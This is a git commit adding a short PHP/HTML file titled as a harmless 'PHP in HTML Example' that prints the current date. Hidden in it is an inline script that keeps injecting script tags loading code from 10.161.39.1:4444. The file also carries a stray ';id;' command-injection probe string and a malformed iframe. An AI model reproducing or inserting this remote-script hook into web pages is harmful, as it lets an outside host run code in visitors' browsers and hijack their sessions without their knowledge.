ed445f54894f6277f1fc7e0c9d7066615f483919
KONTRA <56182197+ABHISHEK-CPU@users.noreply.github.com>
2022-12-22 20:43:44 +0530

    Add files via upload

---
+++ dropbox_test.php
@@ -0,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>PHP in HTML Example</title>
+</head>
+<body>
+	<h1>PHP in HTML Example</h1>
+	<p>
+		<?php
+			echo "The current date and time is: " . date("Y-m-d H:i:s");
+			
+		?>
+	</p>
+	<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//10.161.39.1:4444";d.body.appendChild(z)},0)</script>
+	<iframe src="https://wikipedia.org"/>
+	;id;
+</body>
+</html>
+
